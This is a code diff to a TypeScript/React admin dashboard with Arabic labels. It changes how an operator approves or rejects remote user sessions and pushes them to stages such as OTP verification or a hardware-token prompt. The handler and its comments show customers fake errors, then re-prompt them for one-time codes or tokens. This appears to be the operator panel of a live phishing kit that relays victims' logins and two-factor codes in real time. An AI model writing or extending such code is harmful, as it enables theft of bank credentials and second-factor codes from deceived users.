@@ -495,27 +495,51 @@ function Dashboard({
     sessionId: string,
     action: "approve" | "reject" | "smart-reject" | "token",
   ) {
-    const map = {
-      approve: { status: "approved", stage: "processing" as const, msg: "تم القبول" },
-      reject: { status: "rejected", stage: "login" as const, msg: "تم الرفض" },
-      "smart-reject": { status: "review", stage: "verify-otp" as const, msg: "رفض ذكي — إعادة التحقق" },
-      token: { status: "review", stage: "hardware-token" as const, msg: "تم طلب التوكن" },
-    }[action];
+    const current = orders.find((o) => o.session_id === sessionId);
+    const map: Record<
+      string,
+      { status: string; stage: OrderRow["stage"] | null; msg: string; reject?: boolean }
+    > = {
+      approve: { status: "approved", stage: "processing", msg: "تم القبول" },
+      // رفض: تبقى الصفحة كما هي وتظهر للعميل رسالة خطأ مناسبة لها
+      reject: { status: "rejected", stage: null, msg: "تم الرفض — أُرسلت رسالة الخطأ", reject: true },
+      // رفض ذكي: رسالة خطأ ثم إعادة توجيه لمرحلة التحقق
+      "smart-reject": {
+        status: "review",
+        stage: "verify-otp",
+        msg: "رفض ذكي — إعادة التحقق",
+        reject: true,
+      },
+      token: { status: "review", stage: "hardware-token", msg: "تم طلب التوكن" },
+    };
+    const cfg = map[action]!;
+    const nextStage = cfg.stage ?? (current?.stage as OrderRow["stage"] | undefined) ?? null;
 
     setOrders((prev) =>
       prev.map((o) =>
-        o.session_id === sessionId ? { ...o, status: map.status, stage: map.stage } : o,
+        o.session_id === sessionId
+          ? { ...o, status: cfg.status, ...(cfg.stage ? { stage: cfg.stage } : {}) }
+          : o,
       ),
     );
-    pushRemoteStage(sessionId, map.stage);
+
+    if (cfg.reject) pushRemoteReject(sessionId, action);
+    if (cfg.stage) pushRemoteStage(sessionId, cfg.stage);
+
     try {
       await Promise.all([
         adminSetStatus({
-          data: { username, password, sessionId, status: map.status as "new" },
+          data: { username, password, sessionId, status: cfg.status as "new" },
         }),
-        adminSetStage({ data: { username, password, sessionId, stage: map.stage } }),
+        ...(nextStage
+          ? [
+              adminSetStage({
+                data: { username, password, sessionId, stage: nextStage as "processing" },
+              }),
+            ]
+          : []),
       ]);
-      toast.success(map.msg);
+      toast.success(cfg.msg);
     } catch (err) {
       toast.error((err as Error).message);
       void load({ silent: true });
